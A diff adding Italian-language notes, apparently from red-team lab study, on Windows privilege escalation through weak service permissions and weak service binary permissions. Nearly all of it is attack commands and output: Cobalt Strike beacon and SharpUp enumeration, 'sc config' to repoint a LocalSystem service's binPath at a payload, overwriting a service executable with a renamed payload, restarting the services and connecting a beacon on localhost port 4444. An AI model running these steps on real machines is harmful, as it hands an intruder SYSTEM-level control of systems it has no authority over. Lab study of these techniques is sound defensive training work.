@@ -209,5 +209,70 @@ Service 'VulnService1' has executable 'C:\Program Files\Vulnerable Services\Serv
 but 'C:\Program Files\Vulnerable Services\Service.exe' is modifiable.
 
 
+#Weak Service Permissions
+#da cobalt:
+beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
+
+#outputcobalt
+=== Modifiable Services ===
+
+    Service 'VulnService2' (State: Running, StartMode: Auto)
+
+
+#Per verificare con cmd
+sc qc VulnService2
+#output
+BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
+SERVICE_START_NAME : LocalSystem 
+
+#esempio:
+#carico payload
+mkdir C:\Temp
+copy C:\Payloads\tcp-local_x64.svc.exe C:\Temp\
+
+#modifico percorso binario (spazio dopo binPAth)
+sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
+
+#check se il percorso è cambiato
+sc qc VulnService2
+
+#spegno e riavvio il binario
+sc stop VulnService2
+sc start VulnService2
+
+#una volta creato mi connetto da cobalt
+beacon> connect localhost 4444
+
+#per ripristinare
+beacon> run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
+
+#Weak Service Binary Permissions
+#uguale a sopra, ma sugli exe
+
+beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
+#output che fa vedere che gli utenti possono modificare il file
+Access : BUILTIN\Users Allow Modify, Synchronize
+
+#scarico la copia di esegubile (sempre fare la copia di un binario reale)
+beacon> download Service 3.exe
+
+#preparo il payload rinominandolo
+PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
+
+#Se il servizio è in esecuzione potrebbe dare errore
+#stoppo servizio
+sc stop VulnService3
+
+#sovrascrivo il paylaod
+upload C:\Payloads\Service 3.exe
+#riavvio il servizio 
+sc start VulnService3
+
+#con cobalt, mi connetto
+connect localhost 4444
+
+
+
+
 
 ```
